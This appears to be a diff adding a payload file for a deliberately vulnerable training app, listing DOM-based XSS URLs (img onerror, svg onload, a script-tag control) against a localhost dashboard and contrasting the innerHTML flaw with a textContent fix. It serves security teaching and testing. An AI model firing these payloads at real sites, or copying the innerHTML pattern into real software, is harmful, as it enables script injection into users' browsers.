@@ -1,0 +1,35 @@
+# ===========================================================================
+# Payload: DOM-based XSS
+# Target:  VULNERABLE version — http://localhost:5001
+# Route:   GET /dashboard#<payload>
+# Effect:  app.js reads location.hash and writes it to the DOM using
+#          innerHTML.  The browser parses the hash fragment as HTML and
+#          executes any event-handler attributes.
+# ===========================================================================
+
+# --- img onerror (works even without script tags in some filter scenarios) ---
+http://localhost:5001/dashboard#<img src=x onerror=alert('dom-xss')>
+
+# --- Optional SVG onload: did not fire in the Chromium review; use img above ---
+http://localhost:5001/dashboard#<svg onload=alert('dom-xss-svg')>
+
+# --- Negative control: script tags inserted via innerHTML do not execute ---
+http://localhost:5001/dashboard#<script>alert('dom-xss-script')</script>
+
+# --- Encode the payload if the browser URL-encodes # automatically ---
+# The hash portion is NOT sent to the server, so no server-side filter catches it.
+
+# ===========================================================================
+# How to test:
+#   1. Log in as alice at http://localhost:5001
+#   2. Copy a URL above into the address bar and press Enter.
+#      The page loads normally, then app.js fires and alert() pops.
+#
+# Expected result on VULNERABLE (:5001):
+#   Browser parses the hash as HTML via innerHTML; the image onerror fires (SVG behavior is not reliable in the tested flow).
+#
+# Expected result on SAFE (:5002):
+#   app.js uses textContent instead of innerHTML.
+#   The hash is written to the DOM as a plain string — angle brackets appear
+#   as literal text; no event handler is registered.
+# ===========================================================================
